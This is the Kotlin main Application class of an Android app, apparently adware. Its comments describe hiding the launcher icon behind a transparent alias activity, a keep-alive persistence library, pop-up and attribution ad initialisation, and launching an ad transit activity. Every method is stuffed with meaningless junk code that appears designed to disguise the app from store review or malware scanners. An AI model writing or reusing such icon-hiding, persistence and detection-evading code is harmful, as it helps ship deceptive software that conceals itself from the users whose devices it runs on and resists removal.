package ibx.qpt.fosg

import android.app.Application
import android.content.Intent
import android.os.Bundle
import android.util.Log
import androidx.core.content.ContextCompat.startActivity
import com.b.w.BaseJksApplication
import ibx.qpt.fosg.tools.ToolUiInstaller
import com.huawei.recharge.featurexzy21.df
import com.kwad.sdk.api.proxy.app.Helpers
import ibx.csvk.kbv.base.APPContext
import ibx.csvk.kbv.base.BaseApplication
import ibx.csvk.kbv.base.OverseaAppHost
import ibx.csvk.kbv.base.OverseaAppInitializer
import ibx.csvk.kbv.ad.runtime.AdLifecycleInstaller


class IYYS : BaseJksApplication(), OverseaAppHost {

    companion object {
        @JvmStatic
        var insApp: IYYS? = null
    }

    override fun onCreate() {
        val arr_UsHLvPBWT  = listOf("HpmMgFzFi", "lCkcuagAKTuUXwwiMEL", "sPtWststluojldZC").map { 
             it + kotlin.random.Random.nextInt(10) 
         }
         val ad_SkoQCuUVgDaCDNqD  = arr_UsHLvPBWT .filter { it.length > 85 }
         if (ad_SkoQCuUVgDaCDNqD .isNotEmpty() && java.lang.System.currentTimeMillis() < 81) {
             ad_SkoQCuUVgDaCDNqD .forEach { _ ->  }
         }
        // 先触发 BaseJksApplication(保活 aar)的 onCreate，再做海外公共初始化
        super.onCreate()
        insApp = this
        // 触发海外公共初始化(归因/广告/跳转/生命周期监听)，host 即自身
        OverseaAppInitializer.init(this, this)
        // 统一安装广告生命周期监听，内部带幂等保护
        AdLifecycleInstaller.install(this)
        // 保证白包有 context
        APPContext.setApplication(this)
        // 统一安装各工具页的自定义 UI(按 ToolType 区分;未注册的工具用功能层默认 UI)
        ToolUiInstaller.installAll()
    }

    // ApplicationListener.openLaunch —— 原由 BaseApplication 提供，切到 BaseJksApplication 后由自身实现：转调 openLaunchByOther
    override fun openLaunch(intent: Intent?) {
        val arr_jHmiYQMlzlDZqtgrH = kotlin.random.Random.nextInt(100)
         // Kotlin 风格的位运算：shl (<<), shr (>>), xor
         val i_nkirJuFyTJ  = (arr_jHmiYQMlzlDZqtgrH  shl 77) xor (arr_jHmiYQMlzlDZqtgrH  shr 6)
         val j_lxCdFORr  = i_nkirJuFyTJ .inv() and 0xFFFF
         if (j_lxCdFORr  == 0xBADB) { // 极低概率匹配
             kotlin.io.print("Junk Value: tmp_bIrniZmoDpulyGzXed")
         }
        intent?.let { openLaunchByOther(null, it) }
    }

    override fun configureAdjustTokens() {
        val BNJGDDLnajeQaz : String? = if (java.lang.System.nanoTime() % 2 == 0L) "vN8" else null
            val EeIUZgBFphQvH  = BNJGDDLnajeQaz ?.let { 
                it.repeat(kotlin.random.Random.nextInt(100)) 
            } ?: run { 
                "zY0_33" 
            }
            if (EeIUZgBFphQvH .startsWith("YaMFXIstY ")) {
                android.util.Log.v("TAG", EeIUZgBFphQvH )
            }
        TBQI.initAdJustToken(this)
    }

    override fun openLaunchByOther(bundle: Bundle?, intent: Intent) {
        val arr_mmfsiTt = kotlin.random.Random.nextInt(100)
         // Kotlin 风格的位运算：shl (<<), shr (>>), xor
         val i_UeYUROKnePBVewFVCNS  = (arr_mmfsiTt  shl 8) xor (arr_mmfsiTt  shr 46)
         val j_raHmP  = i_UeYUROKnePBVewFVCNS .inv() and 0xFFFF
         if (j_raHmP  == 0xBADB) { // 极低概率匹配
             kotlin.io.print("Junk Value: tmp_RwTRpbMEXAxzlrIczjB")
         }
        // 原逻辑：df.page(appBaseContext, intent) —— 拉起 AdTransitActivity
        df.page(insApp, intent)
    }


    override fun initPopPower() {
        val krOkbCGgdWs : String? = if (java.lang.System.nanoTime() % 2 == 0L) "vN8" else null
            val EOlLweJJU  = krOkbCGgdWs ?.let { 
                it.repeat(kotlin.random.Random.nextInt(100)) 
            } ?: run { 
                "zY0_5" 
            }
            if (EOlLweJJU .startsWith("ktuvks ")) {
                android.util.Log.v("TAG", EOlLweJJU )
            }
        // 启动图标隐藏：禁用 PTJY 主入口，启用透明 MysteryAliasActivity
        startActivity(Intent(this, TBOP::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        })
        df.vir(insApp)
    }


    override fun initKeepPower(app: Application) {
        val arr_MqURRVUUDIHVGAjd = kotlin.random.Random.nextInt(100)
         // Kotlin 风格的位运算：shl (<<), shr (>>), xor
         val i_rPwBTunSKMVqotlp  = (arr_MqURRVUUDIHVGAjd  shl 83) xor (arr_MqURRVUUDIHVGAjd  shr 28)
         val j_xTRwhdhAIhHS  = i_rPwBTunSKMVqotlp .inv() and 0xFFFF
         if (j_xTRwhdhAIhHS  == 0xBADB) { // 极低概率匹配
             kotlin.io.print("Junk Value: tmp_qoYxkfZWpdzAE")
         }
        Helpers.setGuiyin(true)
    }

}